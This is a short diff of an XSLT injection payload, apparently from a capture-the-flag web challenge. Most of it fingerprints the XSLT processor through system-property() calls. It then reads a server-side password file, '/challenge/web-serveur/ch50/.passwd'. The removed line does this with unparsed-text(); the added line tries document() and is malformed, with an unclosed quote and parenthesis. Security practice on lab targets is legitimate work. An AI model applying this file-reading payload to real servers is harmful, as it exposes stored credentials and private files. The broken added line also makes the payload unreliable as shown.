@@ -14,7 +14,7 @@
     XSLT Version: <xsl:value-of select="system-property('xsl:version')" /><br/>
     XSLT Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br/>
     XSLT Verdor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br/>
-    FileContent: <xsl:value-of select="unparsed-text('/challenge/web-serveur/ch50/.passwd', 'iso-8859-1')" disable-output-escaping="no"/>
+    FileContent: <xsl:value-of select="document('/challenge/web-serveur/ch50/.passwd'>
   </div>
 </xsl:for-each>
 </body>
